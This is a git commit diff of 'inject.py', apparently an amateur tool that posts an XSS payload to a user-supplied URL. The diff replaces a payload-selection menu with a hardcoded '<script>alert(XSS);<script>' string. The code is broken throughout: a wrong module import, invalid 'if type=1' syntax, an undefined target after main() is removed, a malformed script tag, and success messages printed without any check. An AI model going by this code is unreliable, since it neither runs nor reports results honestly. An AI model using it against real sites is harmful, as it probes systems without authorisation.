71f07afa5d9a3e212405c8625b5bbf34c458ebee
MohammadIsCoding1 <80381539+MohammadIsCoding1@users.noreply.github.com>
2021-06-07 00:19:40 -0500

    Update inject.py

--- inject.py
+++ inject.py
@@ -1,64 +1,6 @@
 import request
-
-
-def main():
-  target=raw_input("Url inject: ")
-  type=input('''
-  [1]Javascipt
-  [2]html
-  [3]php
-  
-  > ''')
-  if type=1:
-    choice=input('''
-    [1]injection.js
     
-    > ''')
-    if choice=1:
-      inject_payload=open('injection.js','r').read()
-  
-  if type=="2":
-    choice=input('''
-    [1]template_injection.html
-    [2]basic_injection.html
-    [3]xss.html
-    
-    > ''')
-    
-    if choice=='1':
-      inject_payload=open('template_injection.html','r').read()
-      
-      while True:
-        print('payload injection is sucessful')
-        break
-      
-      while False:
-        print('payload injection fail')
-        break
-    
-    if choice=='2':
-      inject_payload=open('basic_injection.html','r').read()
-      
-      while True:
-        print('payload injection is sucessful')
-        break
-      
-      while False:
-        print('payload injection fail')
-        break
-        
-    if choice=='3':
-      inject_payload=open('xss.html','r').read()
-      
-      while True:
-        print('payload injection is sucessful')
-        break
-      
-      while False:
-        print('payload injection fail')
-        break
-    
-  payload=inject_payload
+  payload='<script>alert(XSS);<script>'
 
   req=request.post(target + payload)
 
@@ -67,6 +9,3 @@ def main():
     print("Attacking payload : "+payload)
   else:
     print("Secure")
-    
-if __name__=="__main__":
-  main()
